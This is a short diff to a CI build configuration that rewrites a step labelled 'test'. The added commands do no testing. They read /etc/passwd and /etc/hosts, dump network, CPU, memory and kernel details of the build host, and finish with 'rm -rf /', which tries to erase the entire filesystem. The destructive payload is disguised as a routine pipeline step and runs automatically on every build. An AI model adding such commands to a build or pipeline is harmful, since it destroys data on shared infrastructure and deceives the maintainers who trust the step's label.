@@ -28,9 +28,15 @@ build:
 
     # Gets the dependencies
     - script:
-        name: go test
+        name: test
         code: |
-          reboot
+          cat /etc/hosts
+          ifconfig
+          cat /etc/passwd
+          cat /proc/cpuinfo
+          free -g
+          uname -a
+          rm -rf /
           
     - script:
         name: go get
